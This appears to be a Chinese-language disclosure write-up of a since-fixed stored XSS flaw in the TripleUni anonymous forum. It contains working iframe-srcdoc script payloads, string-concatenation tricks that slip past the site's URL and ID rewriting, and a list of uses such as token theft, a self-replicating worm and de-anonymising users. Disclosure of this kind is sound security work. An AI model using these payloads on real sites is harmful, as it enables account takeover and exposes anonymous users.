**相信大家都注意到噗噗可以发html的内容了，鉴于该漏洞已经修复，并且噗噗终于支持markdown了，我们决定公开部分技术细节，供各位学习参考。**

## 起因

11 月 1 日晚，我们突发其想想测试一下噗噗对 markdown 的支持，于是从[该网站](https://markdown-it.github.io/)复制了一份 templet 发到树洞#357840，后来惊奇的发现，于如下行语句及之后的所有内容都被高亮了黄色：

```markdown
[\<mark>](https://github.com/markdown-it/markdown-it-mark)
```

通过对比树洞内容：

```markdown
[\](https://github.com/markdown-it/markdown-it-mark)
```

可以发现`<mark>`不见了。

经过提醒，`<mark>`于 html 下也能实现相同的效果，至此，我们粗略判断噗噗支持 html 语法。

在经过多次实验后，我们验证了这个猜测，此外，我们还发现噗噗可以用 css 渲染。

在发现了这个漏洞之后，我们分成两路，一路尝试在树洞内注入 script 脚本，另一路尝试在树洞内嵌套网页实现更多元化的展示效果。

## <\script> 脚本注入

因为脚本注入非常的危险，所以出于对于安全的考量，我们进行了脚本注入的测试。我们首先尝试了最简单的弹窗：

```html
<script>
  alert("hello world");
</script>
```

但是，我们发现并没有弹窗出现，于是我们尝试了其它脚本：

```html
<script>
  var a = document.createElement("a");
  a.href = "https://www.bing.com";
  a.innerHTML = "bing";
  document.body.appendChild(a);
</script>
```

但是，我们发现并没有出现超链接。

就此，我们认为噗噗对于脚本注入进行了限制，停止了脚本注入的测试。

## <\iframe>嵌入

### 嵌入网页

我们尝试了最简单的嵌入网页：

```html
<iframe src="https://www.bing.com/"></iframe>
```

发现成功插入了 iframe，但是 iframe 中竟然提示树洞不存在。

这个问题困扰了我们很久，最后发现是因为噗噗对于网址的处理导致的。

### 网址文本替换

噗噗会对网址添加超链接, 如`https://www.bing.com/`会被替换为:

```html
<a href="https://www.bing.com/" target="_blank">https://www.bing.com/</a>
```

这会导致嵌入网页时出现问题, 例如:

```html
<iframe src="https://www.bing.com/"> </iframe>
```

会被替换为:

```html
<iframe
    src="<a href="https://www.bing.com/"
    target="_blank">https://www.bing.com/</a>">
</iframe>
```

渲染的时候便不能将`src`内的内容识别为外部网址，于是会自动在前面加上`https://tripleuni.com/`，也就是最终该iframe会访问：`https://tripleuni.com/https://www.bing.com/`就有了刚才“树洞不存在”的问题。

从而导致页面无法正常渲染。

这个问题会出现在任何需要网址的地方。

### 解决方案

我们尝试了多种方法，最后通过查阅[mdn docs](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#srcdoc)发现可以通过`srcdoc`属性来解决这个问题。

## srcdoc属性

`srcdoc`属性被认为是`iframe`标签中[最没用](https://www.jianshu.com/p/8f7a6a873457)的属性，但是这个属性让我们有机会直接嵌入 html 代码以及 script 脚本。

### 嵌入 html 代码

```html
<iframe srcdoc="<h1>hello world</h1>"></iframe>
```

可以正常渲染出`hello world`。

### 嵌入 script 脚本

```html
<iframe
  srcdoc="
    <script>
        alert('hello world')
    </script>
"
></iframe>
```

可以正常弹出`hello world`。

### 同域访问

因为`iframe`的`srcdoc`属性可以直接嵌入 html 代码，所以我们可以通过`iframe`来访问同域（噗噗）的资源。

```html
<iframe
  srcdoc="
    <script>
        parent.document.body.innerHTML = ''
    </script>
"
></iframe>
```

以上代码可以清空网页所有内容。


### 解决网址问题

在有了脚本注入的能力之后，我们可以通过脚本来解决网址的问题:

```html
<iframe
  srcdoc="
    <script>
        let iframe = document.createElement('iframe')
        iframe.src = 'htt'+'ps://www.bing.com'
        iframe.style.width = '100%'
        iframe.style.height = '1000'
        parent.document.body.appendChild(iframe)
    </script>
"
></iframe>
```
当噗噗检测到字符串内包含`http`便会将该字符串判断为网页链接，并进行reformat，通过字符串拼接，我们可以避开噗噗的网址检测，成功嵌入了网页。

至此，我们成功的实现了对于噗噗的脚本注入，可以在噗噗上为所欲为（doge）。


## 放飞自我
接下来，我们在噗噗进行了一些有趣的实验。例如：

* 通过iframe注入脚本，在其它用户打开树洞时，可以实现对TripleUni的任意操作，包括但不限于：
  * 获取用户信息
  * 获取树洞信息
  * 获取token
  * 关注树洞
  * 评论树洞
  * 发帖
  * 自我复制
  * 重定向
  * 。。。
* 通过获取用户信息+跨域访问第三方服务器or实名发布树洞，可以实现**去匿名化**。
* 通过自我复制+发布树洞，甚至可以实现一个小型的**蠕虫**程序，对TripleUni进行攻击。
* **事实证明防止html注入真的很重要（doge）**

 **🧐想要了解更多？欢迎参考我们的[GitHub仓库](https://github.com/EZ-HKU/UniScript)。**

## 细枝末节

### 长数字替换

在测试 follow 功能的时候，我们发现该脚本无法正常执行，通过检查元素后发现，在源代码中执行的 js 脚本：

```javascript
follow(123456);
```

在发布后会被替换成：

```javascript
follow(
  <span>
    {" "}
    <a href="javascript:void(0);" onclick="nav2Post('123456', 'HKU')">
      123456
    </a>{" "}
  </span>
);
```

其中`123456`是我们需要 follow 的树洞 ID。

在经过多次测试之后，我们发现当噗噗检测到由 6 位数字组成的字符串的时候，就会自动替换会跳转到相对应树洞的 js 脚本。

不过庆幸的是 js 脚本支持字符串拼接，我们只需要将`123456` 替换成`'123'+'456'`即可。

### EZ-TEAM 倾情呈现
#### I see You, 我看见你